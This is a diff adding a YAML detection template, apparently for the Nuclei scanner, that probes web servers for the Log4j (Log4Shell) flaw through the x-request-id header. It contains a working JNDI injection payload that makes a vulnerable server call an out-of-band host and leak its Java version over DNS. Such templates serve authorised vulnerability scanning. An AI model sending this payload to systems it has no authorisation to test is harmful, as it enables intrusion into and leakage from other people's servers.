@@ -1,0 +1,22 @@
+id: LOG4J-REQUEST-ID
+
+info:
+  name: log4j with x-request-id
+  author: omkar7505
+  severity: critical
+  description: log4j with `x-request-id`
+  tags: rce,oast,log4j
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        x-request-id: ${jndi:rmi://x${sys:java.version}.{{interactsh-url}}/a}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
